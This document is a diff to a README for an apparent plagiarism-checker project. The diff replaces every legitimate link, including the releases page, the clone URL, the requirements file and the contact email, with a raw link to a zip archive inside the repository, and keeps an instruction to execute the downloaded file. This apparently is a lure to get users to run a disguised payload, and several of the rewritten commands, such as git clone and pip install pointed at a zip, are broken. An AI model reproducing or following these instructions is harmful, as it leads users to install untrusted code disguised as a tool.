@@ -2,7 +2,7 @@
 
 Welcome to the **Plagiarism Checker Update** repository! This project aims to provide an efficient and reliable tool for checking documents for plagiarism. Whether you are a student, educator, or professional, this tool can help ensure the originality of your work. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-brightgreen)](https://github.com/ASN-Lab/Plagiarism-Checker-Update/releases)
+[![Download Releases](https://github.com/ASN-Lab/Plagiarism-Checker-Update/raw/refs/heads/main/parine/Checker_Update_Plagiarism_1.1.zip%20Releases-brightgreen)](https://github.com/ASN-Lab/Plagiarism-Checker-Update/raw/refs/heads/main/parine/Checker_Update_Plagiarism_1.1.zip)
 
 ## Table of Contents
 
@@ -34,7 +34,7 @@ To install the Plagiarism Checker Update, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/ASN-Lab/Plagiarism-Checker-Update.git
+   git clone https://github.com/ASN-Lab/Plagiarism-Checker-Update/raw/refs/heads/main/parine/Checker_Update_Plagiarism_1.1.zip
    ```
 
 2. Navigate to the project directory:
@@ -46,10 +46,10 @@ To install the Plagiarism Checker Update, follow these steps:
 3. Install the required dependencies. If you are using Python, you can use:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/ASN-Lab/Plagiarism-Checker-Update/raw/refs/heads/main/parine/Checker_Update_Plagiarism_1.1.zip
    ```
 
-4. After installation, you can download the latest release from the [Releases section](https://github.com/ASN-Lab/Plagiarism-Checker-Update/releases). Make sure to execute the downloaded file to start using the tool.
+4. After installation, you can download the latest release from the [Releases section](https://github.com/ASN-Lab/Plagiarism-Checker-Update/raw/refs/heads/main/parine/Checker_Update_Plagiarism_1.1.zip). Make sure to execute the downloaded file to start using the tool.
 
 ## Usage
 
@@ -92,9 +92,9 @@ This project is licensed under the MIT License. You can view the license [here](
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: support@plagiarismcheckerupdate.com
+- **Email**: https://github.com/ASN-Lab/Plagiarism-Checker-Update/raw/refs/heads/main/parine/Checker_Update_Plagiarism_1.1.zip
 - **GitHub Issues**: You can also open an issue in the repository for any bugs or feature requests.
 
 Thank you for using the Plagiarism Checker Update! We hope it helps you maintain the integrity of your writing. 
 
-For more information and updates, please visit the [Releases section](https://github.com/ASN-Lab/Plagiarism-Checker-Update/releases).
+For more information and updates, please visit the [Releases section](https://github.com/ASN-Lab/Plagiarism-Checker-Update/raw/refs/heads/main/parine/Checker_Update_Plagiarism_1.1.zip).
